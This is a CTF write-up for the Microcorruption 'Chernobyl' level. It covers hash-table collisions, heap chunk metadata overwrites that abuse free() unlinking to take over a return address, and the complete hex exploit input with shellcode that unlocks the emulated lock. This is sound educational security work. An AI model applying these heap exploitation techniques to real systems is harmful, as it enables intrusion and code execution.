---
title: "Microcorruption CTF: Chernobyl"
categories: CTF
comments: true
---

This is my writeup for "Chernobyl", the second to last level on the [Microcorruption](https://microcorruption.com) CTF. Like usual, if you haven't already solved it or given it your very best shot, you should stop reading and go do that now.

## The input

This binary is pretty big compared to previous levels. There's a lot more functionality, and I spent a fair bit of time getting acquainted with the program.

I first stepped through some test inputs to see what was going on. The first character is tested against 0x61, or 'a', and then against 'n'. A bit more digging revealed the following information:

1. The first command "access" takes a username of any length and a pin of any length
2. The second command is "new" (or at the very least a 3 letter word starting with 'n'), and also takes a username and pin of any length
3. The pin, stored as one word (calculated in modular fashion from the input), may not have the high bit set
4. A command beginning with neither 'a' or 'n' terminates the program
5. Commands may be chained using a ';'
6. The input buffer (on the stack) does not overflow, and is wiped entirely after processing each set of entered commands
7. Users and their pins are stored in a hash table
8. Neither the user nor their pin overflows, despite taking arbitrarily large arguments (the username is simply truncated, and the pin is calculated within one register)

## The hash table

I'd never actually familiarized myself with hash table implementations, so I spent a bit of time doing that first. Turns out it's pretty simple. A hash table is initialized with a certain number of bins, in this case 8 (2^3, where the 3 is stored at 0x5008). Keys (in this case, the username string) are hashed. This value, modulo the number of bins, determines where the key and value will be stored.

The collision resolution is simple, the keys and values are stored sequentially, and a search will step through them using `strcmp` to find the key. When the number of entries stored in the hash table (at 0x5006) is greater than its capacity (initially 10, or 5 * 2^(3 - 2), where the 3 comes from 0x5008 and the 5 from 0x500a), the hash table is rehashed, and the number of bins is doubled (0x5008 is incremented).

Once you analyze the hash function (modular hashing, which is exactly what Java does), it's trivial to generate collisions. A bit of testing reveals that this is where the vulnerability is. It turns out that we can pack more key-value pairs in a bin than there was space allocated, before rehashing occurs. We can overwrite the chunk metadata used by `malloc` and `free`. We can also overwrite user data in the following bins.

## Almost a solution

Even though I knew the answer (a quick search revealed there was no code to open the lock), I decided to look at another possibility anyway. How are users activated? After using the `access` command on an existing user, the following instructions are hit:

```nasm
4c0c:  call     #0x49cc <get_from_table>
4c10:  cmp      #-0x1, r15
4c12:  jne      #0x4c1a <run+0xb4>
...
4c1a:  xor      r15, r10
4c1c:  and      #0x7fff, r10
4c20:  jnz      #0x4c32 <run+0xcc>
4c22:  cmp      r10, r15
4c24:  jge      #0x4c2c <run+0xc6>
4c26:  mov      #0x4aa3, r15
4c2a:  jmp      #0x4c9c <run+0x136>
```

The cmp instruction checks if the username was found. If it was, it XORs the returned pin with the entered pin (in r10), and &s with 0x7fff. If all but the most significant bit are equal, the jump at 4c20 will not happen. Then, if r15 is less than r10 (since r10 is zero, r15 must have the high bit set) we move 0x4aa3 into r15, and jump to a `puts` call. The string at address 0x4aa3 happens to be the "Access granted." string! So the high bit in the stored pin is the activated account flag. That is why a pin with the 16th bit set is not accepted.

So all we have to do is enter a bunch of username collisions, and have the last entry overwrite the pin of a user in the next bin to set the high bit. Easy! I did that, it printed the string "Access granted." and then... nothing. Bummer! I already knew it wouldn't, but I felt slightly cheated. After all, this exploit would work in an actual production lock!

## Exploiting the heap

This heap exploit works in a very similar fashion to a previous level, "Algiers". `malloc` and `free` appear to have the same implementation. A bit of stepping reveals that `free` is called during `rehash`. This is the call we can exploit.

The `free` function looks approximately like this. Note that the least significant bit of the `size` field is actually a flag that indicates whether the chunk is in use or not (this can be done safely since the chunks have to be aligned in memory).

```c
struct malloc_chunk {
    malloc_chunk *bk;
    malloc_chunk *fd;
    uint16_t size;
};

void free(void *ptr) {
    malloc_chunk *p = ptr - 6;
    p->size &= ~1;

    malloc_chunk *prev = p->bk;
    if (prev->size & 1 == 0) {
        prev->size += p->size + 6;
        prev->fd = p->fd;
        p->fd->bk = prev;
        p = prev;
    }

    malloc_chunk *next = p->fd;
    if (next->size & 1 == 0) {
        p->size += next->size + 6;
        p->fd = next->fd;
        next->fd->bk = p;
    }
}
```

All we have to do is make sure the previous chunk is available, and then using carefully selected values for the `bk` and `fd` fields, we can overwrite the return address and take control of the program. One way to do this is to set `bk` as the desired destination address, and `fd` as the location of the return address on the stack.

But wait! In the call to `rehash`, the new bins are allocated first. `malloc` does this by stepping through the linked list in the metadata of each chunk (more advanced versions of `malloc` only include this metadata in unused chunks). So if we overwrite one chunk's metadata, `malloc` will jump to our overwritten value and most likely crash. Only after the new bins have all been allocated is `free` called, sequentially for each old bin. There's an easy way around this: we can overwrite one chunk's metadata to have `fd` point two chunks ahead. In the skipped chunk, we can safely overwrite the metadata. Okay! Let's write our input.

## Calculating our input

Each bin has room for 5 entries. The 6th will overwrite the metadata. Unfortunately, the initial capacity is 11, so we won't be able to overwrite two. Luckily, the bin size remains the same after rehashing. So we'll allow the first rehash to execute as intended. The second rehash happens before the 22nd user is entered. We will need:

1. 6 users in one bin, with the last overwriting the next chunk's metadata to skip one chunk
2. 6 users in the following bin, with the last overwriting the next chunk's metadata with the return address location and new value
3. 10 other users distributed in other bins
4. A tablespoon of shellcode

The hash function is a modular hash function with 31 as the small prime. We already know that after one rehash, there will be 16 bins. So to generate collisions we can just use single bytes, incrementing by 16. To start off, let's place 5 dummy users in each of the first 3 bins (this will also allow the first rehash to happen as intended).

```
6e6e6e6e10203b6e6e6e6e30203b6e6e6e6e40203b6e6e6e6e50203b6e6e6e6e60203b
6e6e6e6e1f203b6e6e6e6e2f203b6e6e6e6e3f203b6e6e6e6e4f203b6e6e6e6e5f203b
6e6e6e6e1e203b6e6e6e6e2e203b6e6e6e6e3e203b6e6e6e6e4e203b6e6e6e6e5e203b
```

The 6e6e6e6e is simply "nnnn" to satisfy the program's requirements of the `new` command. "10203b" is the username, a space to trigger the username end, and a semi-colon to chain the next command. This user's pin will be calculated as 0, although it's not relevant for our exploit. The first five modulo 16 are all equal to 0, the next five 15, and the last 14. This places them in consecutive bins. Now let's overwrite the chunk metadata.

```
6e6e6e6e8853a85407203b
```

The sixth user in the bin is directly aligned with the following chunk's metadata, so we don't need any dummy bytes. The fourth chunk's address is 0x54a8, so we overwrite the second chunk's `fd` field to point here, skipping the third. We leave the `bk` field as it was. The 0x07 ensures that the hash modulo 16 is equal to 0, and that this user is placed in the desired first bin.

```
6e6e6e6e8e3ece3d0e203b
```

The third chunk's metadata is overwritten with the location of the return address on the stack, 0x3dce, and the desired value, 0x3e8e where we will place our shellcode. Again, the 0x0e places this user in the second bin.

All that's left is to add 5 more dummy users to trigger the second rehash and then tack on our shellcode at the end of our input, at address 0x3e8e. I put this at the end, in an unprocessed user since it contains null bytes and I didn't feel like designing shellcode without null bytes. Since the `free` call modifies more memory around our target (for example, the `size` field), I used a jump to skip past the garbage bytes, to our familiar shellcode. It looks like this:

```nasm
jmp      $+0x8
...
mov      #0xff00, sr
call     #0x10
```

The final input looks like this:

```
6e6e6e6e10203b6e6e6e6e30203b6e6e6e6e40203b6e6e6e6e50203b6e6e6e6e60203b
6e6e6e6e1f203b6e6e6e6e2f203b6e6e6e6e3f203b6e6e6e6e4f203b6e6e6e6e5f203b
6e6e6e6e1e203b6e6e6e6e2e203b6e6e6e6e3e203b6e6e6e6e4e203b6e6e6e6e5e203b
6e6e6e6e8853a85407203b6e6e6e6e8e3ece3d0e203b6e6e6e6e1d203b6e6e6e6e2d20
3b6e6e6e6e3d203b6e6e6e6e4d203b6e6e6e6e5d203b033c000000000000324000ffb0
121000
```

## Final thoughts

I took the path of least resistance and simply hid the chunk I was manipulating from `malloc`, but it would have been possible to do this with a single chunk metadata overwrite. In this case, we just have to make sure that the `fd` pointer in the overwritten chunk points to either the end of the heap or a dummy chunk that we create, at an address higher than the current chunk. Else we run the risk that `malloc` thinks the heap has been exhausted. In this case, we could exploit the first rehash and our input would be a lot shorter.

A working exploit is a working exploit though, so I didn't bother going the extra mile. Especially since I doubt I'll see this implementation of the heap again!
